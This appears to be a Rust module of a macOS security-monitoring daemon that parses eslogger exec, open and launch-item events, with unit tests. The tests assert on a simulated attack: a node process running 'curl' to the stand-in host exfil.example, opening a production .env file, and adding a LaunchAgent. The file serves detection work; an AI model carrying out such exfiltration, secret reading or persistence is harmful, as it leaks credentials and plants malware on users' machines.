//! Interpretação das linhas JSON do `eslogger`.
//!
//! O formato do `eslogger` não é uma API estável (a Apple avisa que pode mudar),
//! então o parser lê só os campos de que precisa, via `serde_json::Value`, e
//! ignora o resto. Se a estrutura mudar, o evento vira `Other` em vez de derrubar o daemon.

use serde_json::Value;
use vigia_proto::ProcInfo;

const CS_VALID: u64 = 0x1;
const CS_ADHOC: u64 = 0x2;

#[derive(Debug, Clone, PartialEq)]
pub enum EsEvent {
    /// `process` executou `exec` e virou `target` (mesmo pid, nova imagem).
    Exec {
        process: ProcInfo,
        target: ProcInfo,
    },
    Open {
        process: ProcInfo,
        path: String,
    },
    /// Novo LaunchAgent, LaunchDaemon ou item de login.
    BtmAdd {
        process: ProcInfo,
        instigator: Option<ProcInfo>,
        item_path: Option<String>,
        executable_path: Option<String>,
    },
    Other,
}

pub fn parse_line(line: &str) -> Option<EsEvent> {
    let v: Value = serde_json::from_str(line).ok()?;
    let event = v.get("event")?.as_object()?;
    let process = proc_from(v.get("process")?)?;

    if let Some(exec) = event.get("exec") {
        let mut target = proc_from(exec.get("target")?)?;
        target.args = exec
            .get("args")
            .and_then(|a| a.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|s| s.as_str().map(String::from))
                    .collect()
            })
            .unwrap_or_default();
        target.cwd = exec.get("cwd").and_then(path_of);
        return Some(EsEvent::Exec { process, target });
    }
    if let Some(open) = event.get("open") {
        let path = open.get("file").and_then(path_of)?;
        return Some(EsEvent::Open { process, path });
    }
    if let Some(btm) = event.get("btm_launch_item_add") {
        let instigator = btm.get("instigator").and_then(proc_from);
        let item = btm.get("item");
        let item_path = item
            .and_then(|i| i.get("item_url"))
            .and_then(|u| u.as_str())
            .map(file_url_to_path);
        let executable_path = btm
            .get("executable_path")
            .and_then(|s| s.as_str())
            .map(String::from);
        return Some(EsEvent::BtmAdd {
            process,
            instigator,
            item_path,
            executable_path,
        });
    }
    Some(EsEvent::Other)
}

/// `{"path": "...", "path_truncated": false, ...}` -> caminho.
fn path_of(v: &Value) -> Option<String> {
    v.get("path").and_then(|p| p.as_str()).map(String::from)
}

fn proc_from(v: &Value) -> Option<ProcInfo> {
    if v.is_null() {
        return None;
    }
    let path = v.get("executable").and_then(path_of)?;
    let pid = v
        .get("audit_token")
        .and_then(|t| t.get("pid"))
        .and_then(|p| p.as_i64())
        .unwrap_or(0) as i32;
    let ppid = v.get("ppid").and_then(|p| p.as_i64()).unwrap_or(0) as i32;
    let signing_id = v
        .get("signing_id")
        .and_then(|s| s.as_str())
        .filter(|s| !s.is_empty())
        .map(String::from);
    let team_id = v
        .get("team_id")
        .and_then(|s| s.as_str())
        .filter(|s| !s.is_empty())
        .map(String::from);
    let platform = v
        .get("is_platform_binary")
        .and_then(|b| b.as_bool())
        .unwrap_or(false);
    let flags = v.get("codesigning_flags").and_then(|f| f.as_u64());
    let signed = match flags {
        _ if platform => Some(true),
        _ if team_id.is_some() => Some(true),
        Some(f) => Some(f & CS_VALID != 0 && f & CS_ADHOC == 0),
        None => None,
    };
    Some(ProcInfo {
        pid,
        ppid,
        path,
        args: vec![],
        cwd: None,
        signing_id,
        team_id,
        signed,
    })
}

/// `file:///Users/x/Library/LaunchAgents/a%20b.plist` -> `/Users/x/Library/LaunchAgents/a b.plist`
pub fn file_url_to_path(url: &str) -> String {
    let raw = url.strip_prefix("file://").unwrap_or(url);
    let bytes = raw.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let Ok(b) = u8::from_str_radix(&raw[i + 1..i + 3], 16) {
                out.push(b);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

#[cfg(test)]
mod tests {
    use super::*;

    const EXEC: &str = include_str!("../tests/fixtures/exec_curl.json");
    const OPEN: &str = include_str!("../tests/fixtures/open_env.json");
    const BTM: &str = include_str!("../tests/fixtures/btm_add.json");

    #[test]
    fn parses_exec_with_args_and_cwd() {
        match parse_line(EXEC).unwrap() {
            EsEvent::Exec { process, target } => {
                assert_eq!(process.path, "/usr/local/bin/node");
                assert_eq!(process.signed, Some(false));
                assert_eq!(target.path, "/usr/bin/curl");
                assert_eq!(target.pid, 4242);
                assert_eq!(target.ppid, 4100);
                assert_eq!(
                    target.args,
                    vec!["curl", "-s", "https://exfil.example/collect"]
                );
                assert_eq!(
                    target.cwd.as_deref(),
                    Some("/Users/dev/Documents/www/third-party/ws-demo")
                );
                assert_eq!(target.signed, Some(true));
            }
            e => panic!("esperava Exec, veio {e:?}"),
        }
    }

    #[test]
    fn parses_open() {
        match parse_line(OPEN).unwrap() {
            EsEvent::Open { process, path } => {
                assert_eq!(process.pid, 4100);
                assert_eq!(
                    path,
                    "/Users/dev/Documents/www/projects/loja-backoffice/.env.prd"
                );
            }
            e => panic!("esperava Open, veio {e:?}"),
        }
    }

    #[test]
    fn parses_btm_add() {
        match parse_line(BTM).unwrap() {
            EsEvent::BtmAdd {
                instigator,
                item_path,
                executable_path,
                ..
            } => {
                assert_eq!(instigator.unwrap().pid, 4100);
                assert_eq!(
                    item_path.as_deref(),
                    Some("/Users/dev/Library/LaunchAgents/com.updater helper.plist")
                );
                assert_eq!(
                    executable_path.as_deref(),
                    Some("/Users/dev/.cache/twh/agent")
                );
            }
            e => panic!("esperava BtmAdd, veio {e:?}"),
        }
    }

    #[test]
    fn unknown_event_is_other_and_garbage_is_none() {
        let line = r#"{"process":{"executable":{"path":"/bin/ls"},"audit_token":{"pid":1}},"event":{"close":{}}}"#;
        assert_eq!(parse_line(line), Some(EsEvent::Other));
        assert_eq!(parse_line("não é json"), None);
    }

    #[test]
    fn decodes_file_urls() {
        assert_eq!(file_url_to_path("file:///a/b%20c.plist"), "/a/b c.plist");
        assert_eq!(file_url_to_path("/sem/url"), "/sem/url");
    }
}
